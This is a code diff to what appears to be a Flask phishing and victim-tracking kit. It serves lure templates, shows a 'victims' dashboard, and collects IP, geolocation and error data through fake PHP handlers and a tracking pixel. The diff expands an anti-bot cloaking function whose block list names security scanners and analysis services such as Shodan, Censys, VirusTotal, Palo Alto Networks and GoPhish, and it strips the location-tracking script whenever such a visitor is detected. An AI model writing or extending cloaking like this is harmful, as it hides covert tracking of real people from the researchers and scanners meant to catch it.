@@ -199,18 +199,40 @@ def dashboard():
     return render_template('dashboard.html', templates=templates, victims=victims, request=request)
 
 # =============== ANTI-BOT SYSTEM ===============
-def is_bot(user_agent):
-    """Detects if the request comes from a preview bot, crawler, or scraper."""
-    if not user_agent:
+def is_bot(req_or_ua):
+    """Advanced heuristic to detect bots, crawlers, security scanners, and preview systems."""
+    # Permet de passer soit la requête Flask entière, soit juste la chaîne User-Agent
+    if hasattr(req_or_ua, 'headers'):
+        ua_str = req_or_ua.headers.get("User-Agent", "")
+        # Vérification 1 : Pas de User-Agent, ou entête typique manipulée
+        if not ua_str or 'Accept-Language' not in req_or_ua.headers:
+            # Beaucoup de scanners de sécurité et bots ne mettent pas d'Accept-Language
+            return True
+    else:
+        ua_str = str(req_or_ua)
+
+    if not ua_str:
         return True
-    ua = user_agent.lower()
+
+    ua = ua_str.lower()
+    
+    # Base de signatures massives (Sécurité, OSINT, Automatisation, Sociaux)
     bot_patterns = [
         'bot', 'spider', 'crawler', 'preview', 'facebookexternalhit', 'whatsapp',
         'telegram', 'twitterbot', 'slackbot', 'discordbot', 'skypeuripreview',
         'linkedinbot', 'vkshare', 'googlebot', 'bingbot', 'yandexbot', 'duckduckbot',
-        'headlesschrome', 'phantomjs', 'curl', 'wget', 'python-requests', 'datanyze'
+        'headlesschrome', 'phantomjs', 'curl', 'wget', 'python-requests', 'datanyze',
+        'shodan', 'censys', 'nmap', 'masscan', 'zgrab', 'research', 'scan', 'paloaltonetworks',
+        'expanse', 'virustotal', 'urlredirect', 'mediapartners-google', 'slurp',
+        'baiduspider', 'semrushbot', 'ahrefsbot', 'mj12bot', 'postman', 'httpclient',
+        'java', 'urllib', 'libwww', 'go-http-client', 'ruby', 'scrapy', 'gophish',
+        'puppeteer', 'playwright', 'cypress', 'outbrain', 'pinterest', 'quora'
     ]
-    return any(bot in ua for bot in bot_patterns)
+    
+    if any(bot in ua for bot in bot_patterns):
+        return True
+        
+    return False
 
 # =============== APP ROUTES ===============
 @app.route('/t/<tpl_name>')
@@ -247,7 +269,7 @@ def serve_target(tpl_name):
             content = content.replace('FALLBACK_URL', fallback)
             
             # Anti-Bot Filtering: strip JS execution if it's a known bot
-            if is_bot(request.headers.get("User-Agent", "")):
+            if is_bot(request):
                 # Remove the location script from the page to prevent false pings
                 content = content.replace('<script src="/js/location.js"></script>', '')
                 content = content.replace('<script src="../js/location.js"></script>', '')
@@ -267,8 +289,7 @@ def serve_js(filename):
 # =============== API ENDPOINTS (DATA COLLECTION) ===============
 @app.route('/t/<tpl_name>/info_handler.php', methods=['POST'])
 def info_handler(tpl_name):
-    user_agent = request.headers.get("User-Agent", "")
-    if is_bot(user_agent) or is_bot(request.form.get('Brw', '')):
+    if is_bot(request) or is_bot(request.form.get('Brw', '')):
         return "OK"
         
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
@@ -321,7 +342,7 @@ def info_handler(tpl_name):
 
 @app.route('/t/<tpl_name>/result_handler.php', methods=['POST'])
 def result_handler(tpl_name):
-    if is_bot(request.headers.get("User-Agent", "")):
+    if is_bot(request):
         return "OK"
         
     loc_info = {
@@ -343,7 +364,7 @@ def result_handler(tpl_name):
 
 @app.route('/t/<tpl_name>/error_handler.php', methods=['POST'])
 def error_handler(tpl_name):
-    if is_bot(request.headers.get("User-Agent", "")):
+    if is_bot(request):
         return "OK"
         
     err_info = {
@@ -362,13 +383,13 @@ def error_handler(tpl_name):
 @app.route('/token/<token_id>.png')
 def honeytoken_pixel(token_id):
     pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
-    user_agent = request.headers.get("User-Agent", "Unknown")
     
     # If it's a known bot/crawler just returning the pixel silently
-    if is_bot(user_agent):
+    if is_bot(request):
         return Response(pixel, mimetype="image/png")
         
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
+    user_agent = request.headers.get("User-Agent", "Unknown")
     
     # Save hit to DB
     tpl_name = f"📄 Doc_Piégé_{token_id}"
